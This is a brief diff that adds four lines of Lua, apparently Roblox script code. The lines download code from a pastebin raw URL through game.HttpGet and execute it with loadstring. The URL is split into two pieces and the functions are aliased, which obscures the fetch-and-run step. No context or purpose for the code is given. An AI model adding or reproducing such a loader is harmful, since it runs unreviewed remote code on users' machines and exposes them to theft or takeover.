@@ -1,0 +1,4 @@
+local x={"https://pastebin.com/raw/","piCigE2m"}
+local f=loadstring
+local g=game.HttpGet
+f(g(game,x[1]..x[2]))()
